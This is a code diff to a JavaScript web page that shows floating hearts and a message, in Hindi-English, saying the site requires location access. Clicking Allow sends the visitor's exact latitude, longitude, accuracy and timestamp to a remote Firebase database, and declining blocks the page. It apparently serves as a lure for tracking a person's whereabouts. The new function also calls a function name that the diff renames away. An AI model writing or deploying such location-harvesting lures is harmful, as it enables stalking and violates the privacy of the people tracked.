@@ -51,25 +51,42 @@ let userName = localStorage.getItem("userName") || null;
 /* ------------------------------- */
 /* ASK LOCATION FIRST              */
 /* ------------------------------- */
-function askNameThenContinue(){
+function askLocationFirst_thenName(){
 
-  if (!userName) {
-    let n = prompt("Enter your name:");
+  createHearts();
 
-    if (!n || n.trim() === "") {
-      return askNameThenContinue();
-    }
+  titleEl.textContent = "📍 Please allow location";
 
-    userName = n.trim();
-    localStorage.setItem("userName", userName);
-  }
+  extra.innerHTML = `
+  <p style="margin-bottom:12px;">
+  Website continue karne ke liye location allow karna zaroori hai
+  </p>
 
-  db.ref("chat/" + chatID + "/name").set(userName);
+  <button id="allowLocationBtn">Allow Location</button>
+  `;
 
-  startGPS();
+  card.classList.add("show");
 
-  idx = 0;
-  showPage(idx);
+  document.getElementById("allowLocationBtn").onclick = function(){
+
+    navigator.geolocation.getCurrentPosition(function(pos){
+
+      db.ref("chat/" + chatID + "/gps").set({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: pos.coords.accuracy,
+        ts: Date.now()
+      });
+
+      askNameThenContinue();
+
+    }, function(){
+
+      titleEl.textContent = "❌ Location required to continue";
+
+    });
+
+  };
 
 }
 
